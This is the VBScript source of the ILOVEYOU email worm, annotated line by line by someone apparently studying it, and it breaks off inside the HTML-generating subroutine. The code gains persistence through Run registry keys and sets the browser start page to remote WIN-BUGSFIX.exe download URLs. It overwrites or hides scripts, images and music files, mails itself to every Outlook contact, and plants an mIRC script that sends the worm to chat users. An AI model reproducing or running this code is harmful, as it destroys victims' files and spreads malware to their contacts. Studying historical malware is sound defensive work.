On Error Resume Next rem the script will still run despite any error
Dim fso,dirtemp,dirsystem,dirwin,eq,ctr,file,vbscopy,dow rem procedural level variables
eq=""
ctr=0
Set fso =CreateObject("Scripting.FileSystemObject") rem we have created a filesystem object which allows deletion,creation or any other file operations
rem we have created a file object to access and manipulate the file system
set file =fso.OpenTextFile(WScript.ScriptFullName,1) rem this will inject the script into other folders and spread the virus
vbscopy = file.ReadAll rem this will hold the copy of the original file 

main() rem main functions to run the script , access the registry and spread the virus

rem we have to define each routine starting from main to the various sub routines used in main routine

Sub main() rem subroutine to initialize the script

On Error Resume Next
Dim wscr, rr

Set wscr= CreateObject("WScript.Shell") rem creates a shell object to interact with operating system
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout") rem reads the registry key which tells the scripting time-out
if (rr>=1) Then rem checks if current timeout is more than 0
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD" rem sets the timeout to 0 seconds in case the script is taking a lot of time to run
End If
Set drwin=fso.GetSpecialFolder(0) rem accessing the windows folder
Set dirsystem=fso.GetSpecialFolder(1) rem accessing the system folder
Set dirtemp=fso.GetSpecialFolder(2) rem accessing the temperory folder
Set c=fso.GetFile(Wscript.ScriptFullName) rem accessing the information about current script file

c.Copy(dirsystem & "\MSKernel32.vbs") rem copying the content to system folder with the name MSKernel32.vbs
c.Copy(dirwin & "\Win32DLL.vbs") rem copying the content to windows folder with the name Win32DLL.vbs
c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs") rem copying the content to system folder with name Love_letter-for-you.txt.vbs

rem calling other sub routines
regrun() rem creates a registry entry for restarting the script if the machine restarts, also adds entry in windows registry
html() rem spreads the virus further by listening to mouse and keyboard events to open further windows
spreadtoemail() rem spreads this virus to other contacts by accessing the outlook address book of the user , maintains registry count to not sent multiple emails to same user
listadriv() rem call the folderlist() subroutine to get all the list of folders and files and further calls the infectfiles() subroutine to infect those files

End Sub

rem now we will create all the subroutines and functions to execute the main routine

Sub regrun() rem subroutine to create and update special registry values
 On Error Resume Next
 Dim num,dowread rem creating variables to store the values for random number and download directory path

 rem creating registry entries for Win32DLL.vbs and MSKernel32.vbs to run upon restart
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32" , dirsystem & "\MSKernel32.vbs" 
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"
 dowread="" rem initialization of the path variable to be empty
 dowread=regget("HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Download Directory") rem get the path from the regget function
 If (dowread="") Then rem checking if there exists a folder in Internet Explorer directory ,if not , we will set the download folder to C folder
 dowread="C:\"
 End If

 If(fileexists(dirsystem & "WinFAT32.exe")=1) Then rem checking whether the WinFAT32 file is there in the system folder
 Randomize
 num=Int((4*Rnd)+1) rem creating a random number from 1 to 4 which will be used further

rem using the 4 random numbers opening provided sites with WIN_BUGSFIX.exe malicious code file 
 If (num=1) Then 
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"

 ElseIf (num=2) Then
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"

 ElseIf (num=3) Then
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"

 ElseIf (num=4) Then
 regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"

 End If

 End If

If (fileexists(dowread & "\WIN-BUGSFIX.exe")=0) Then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", dowread & "\WIN_BUGSFIX.exe"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
End If 
End Sub

rem sub routine for listing out all the drives in the system 
Sub listadriv()
On Error Resume Next
Dim dc,d,s
Set dc=fso.Drives rem variable which contains all the drives of the system
For Each d in dc rem traversing through all the drives of the system
If (d.DriveType=2) Or (d.DriveType=3) Then rem checks whether the drive is removable(2) or fixed(3)
folderlist(d.path &"\") rem this creates the path for each folder in each drive of the system
End If
Next
listadriv=s rem we are storing the lowercase path names of all the drives in listadriv
End Sub

Sub infectfiles(folderspec) rem subroutine which takes in a single parameter of the path of the folders to be infected
On Error Resume Next
rem f-file object that represents the folder, f1- file object that represents files in the folder, fc- files collection, ext-string that contains the extension of the current file,ap-textstream object that will be used to overwrite with infected code
rem mircframe- contains the name of IRC(internet relay client) related file, s-lowercase entire name of the file,  bname-base name of the file, mp3-TextStream object to create vbs files out of the mp3 files
Dim f,f1,fc,ap,ext,mircframe,s,bname,mp3
Set f=fso.GetFolder(folderspec) rem getting the folder from the path
Set fc=f.Files rem set the file object for each file in the folder
For Each f1 in fc rem traversing through each file in the folder
ext=fso.GetExtensionName(f1.path) rem getting the extension name for each file f1
ext=Lcase(ext) rem changing it into lowercase
s=LCase(f1.name) rem assigning the lowercase path name of the original file to the s variable

If (ext="vbs") Or (ext="vbe") Then rem if the file is a vbs or vbe , we will corrupt that file with this code using the vbscopy and ap variable
Set ap=fso.OpenTextFile(f1.path,2,true) 
ap.write vbscopy
ap.close


rem if the extensions are any of the written below, it open the file , overwrite the existing file with vbs code and then delete the original file
ElseIf (ext ="js") Or 
(ext ="htm") Or
(ext ="css") Or
(ext ="hta") Or
(ext ="wsh") Or
(ext ="sct") Then 
Set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.Close
bname=fso.GetBaseName(f1.path)
Set cop=fso.GetFile(f1.path)
cop.copy(folderspec & "\" &bname & ".vbs") rem creating a new fake vbs path name for the new corrupted file
fso.DeleteFile(f1.path)
End If 


rem if the file is a mp3 or a mp4 , it creates a new file with vbs code and hides the original file hence the CreateTextFile function
rem Normal Files have attributes set to 0 hence adding 2 will eventually hide the original file
ElseIf (ext="mp3") Or (ext="mp4") Then
Set mp3=fso.CreateTextFile(f1.path & ".vbs")
mp3.write vbscopy
mp3.Close
Set att =fso.GetFile(f1.path)
att.Attributes=att.Attributesttributes+2

rem checking whether any jpeg files or jpg files are present , overwriting them and deleting them
ElseIf (ext="jpeg") Or (ext="jpg") Then
Set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.Close
Set cop=fso.GetFile(f1.path)
cop.copy(f1.path & ".vbs")
fso.DeleteFile(f1.path)

End If

If (eq <> folderspec) Then
If (s="mirc32.exe") Or
(s="mlink32.exe") Or
(s="mirc.ini") Or
(s="script.ini") Or
(s="mirc.hlp") Then 
Set scriptini=fso.OpenTextFile(folderspec & "\script.ini")
scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, If mIRC will"
        scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.Close
    eq=folderspecify
End If
End If 
Next 
End Sub 

Sub folderlist(folderspec) rem folderspec is the path of the top most folder to be infected
On Error Resume Next
Dim f,f1,sf rem creating 3 variables for folder , subfolders object and folders object representing the collection of all subfolders
Set f=fso.GetFolder(folderspec)
rem set the variables to the top most folder to be infected
Set sf=f.SubFolders
rem recursively infect the subfolders and call the folder lost function for the subfolders of the subfolders and so on....
For each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
Next
End Sub

rem Subroutine to create and write registry entries
Sub regcreate(regkey,regvalue)
Set regedit=CreateObject("WScript.Shell") rem Creation of the WScript.Shell object interacts with windows registry
regedit.RegWrite regkey,regvalue rem We write the key and value to the registry for the given parameters
End Sub


Function regget(value) rem takes in a single parameter which is the path to the registry key
regedit=CreateObject("WScript.Shell") rem object to interact with windows registry
regget=regedit.RegRead(value) rem reads the value of the registry key specified by the value parameter and returns the value
End Function 

rem a function that takes in a file path and check whether the file exists or not
Function fileexists(filespec)
On Error Resume Next
Dim msg rem used to store True and False values
If (fso.FileExists(filespec)) Then rem using the VBScript function FileExists we can store true and false values in the msg variable
msg=0
Else 
msg=1
End If
fileexists=msg 
End Function

rem Function to check if a folder exists, same as fileexists but different VBScript function is used
Function folderexist(folderspec)
On Error Resume Next
Dim msg
If (fso.GetFolderExists(folderspec)) Then 
msg=0
Else
msg=1
End If
folderexist=msg
End Function

rem Creating a Rountine for spreading to email using Microsoft Outlook MAPI API which communicates with exchange server wherein the address list is saved
Sub spreadtoemail()
On Error Resume Next
rem x-counter variable,a-address list object , ctrlist-Counter which stores the number of address list, ctrentries-Counter which stores the number of entries in a address list
rem malead-Address Entry object, (b,regv,regad)-Variables which store the value of registry key
Dim x,a,ctrlist,ctrentries,malead,b,regedit,regv,regad 
Set regedit=fso.CreateObject("WScript.Shell")
Set out=WScript.CreateObject("Outlook.Application") rem creates a Outlook.Application object in registry
Set mapi=out.GetNameSpace("Mapi") rem This gets the MAPI Namespace used to access the address list
rem Namespace allows us to manage a collection of repositories and repository attributes, in our case address list and various addresses

rem This loop goes through all the contacts in the address list and sends them an email
For ctrlist=1 To mapi.AddressLists.Count rem Iterates over all the address lists in  namespace
Set a=AddressLists(ctrlist) rem assigns current address list to a
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a) rem this is used to track whether email has been sent to current address LIST or not
If (regv="") Then rem checks whether the registry key exists or not , in this case we are checking if it does not exist
regv=1 rem creating the registry key and setting to 1
End If

If (int(a.AddressList.Count)>int(regv)) Then rem condition which checks the total addresses vs the total email sends, they should be equal
For ctrentries=1 To a.AddressEntries.Count rem traversing through the address list
malead=a.AddressEntries(x) rem Current address is stored in malead variable for the next victim
regad="" rem intializing
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead) rem this registry key is used to store the value indicating whether the email has been sent to the user or not
If (regad="") Then rem if the email has not been sent to the user
Set male= out.CreateItem(0) rem creating a new mail object for the new victim
rem below is the process of creating the mail
male.Recipients.Add(malead) rem adding the malead to the recipient column
male.Subject="I_LOVE_YOU_SO_MUCH" rem adding the subject
male.body=vbcrlf & "Kindly check this attached love letter from my side which expresses my love for you" rem writing something in the email body
male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs") rem attaching the file by extracting it from system folder to the attachments column
male.Send rem sending the email to the victim
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead,1,"REG_DWORD" rem updating the registry key for that user to 1 to indicate that the email has already been sent to this user
End If
x=x+1 rem increasing the counter
Next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a,a.AddressEntries.Count rem updating the total count of email sends to further victims to keep a track 
Else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a,a.AddressEntries.Count rem updating the total count of email sends to further victims to keep a track 
End If
Next
rem The below variables are set to Nothing to prevent memory leaks, since their use is now not required after spreading . This prevents the computer to slow down
Set out=Nothing
Set mapi=Nothing
End Sub

Sub html() rem generates an html page which contains JScript and VBScript to replicate itself by using ActiveX. Also, responds to mouse and key events
On Error Resume Next
rem lines- an array that will store the lines of the script file, dta1-string variable which will store the first part of the html 
rem dta2- Store the second part of the html , dt1- string variable which will store the encoded version of dta1 , dt2- string variable which will store the encoded version of dta2
rem dt3- Store the encoded version of dt2 , dt4->dt5->dt6 (further encoded versions down the spiral), l1- upper bound of the lines variable
Dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,dt5,dt6,l1
rem I legit do not understand much of this html code just the basic technicalitiess that this code will allow the virus to open and change folders as well as opening various html pages that will contain information about the authors. Also it will open these html pages based on various clicks of keyboard buttons as well as mouse
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML <?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>" rem generates a malicious HTML document, contains VBS placeholders to replace <?-?TITLE> with actual title of the HTML document
& vbcrlf & _  "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>" rem assigns the author and other information to dta1 variable
& vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>" rem adds description to dta1 variable
rem @-@ and #-# are placeholders for vbs script and will be replaced with actual values once the script is executed 
& vbcrlf & _ "<?-? HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#>@-@) "
& vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"    & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
& vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
& vbcrlf & _ "<?-?BODY><?-?HTML>"
& vbcrlf & _ "<SCRIPT language=@-@JScript@-@>"
& vbcrlf & _ "<!--?-??-?"
& vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
& vbcrlf & _ "?-??-?-->"
& vbcrlf & _ "<?-?SCRIPT>"
& vbcrlf & _ "<SCRIPT LANGUAGE=@-@VBScript@-@>"
& vbcrlf & _ "<!--"
& vbcrlf & _ "on error resume next"
& vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
& vbcrlf & _ "aw=1"
& vbcrlf & _ "code="
rem As a matter of fact, I really can't wrap my head around the html sub routine which contains all the html code, looks like I would need to learn complete html and then attempt the entire subroutine









    








    
    








    
    
    




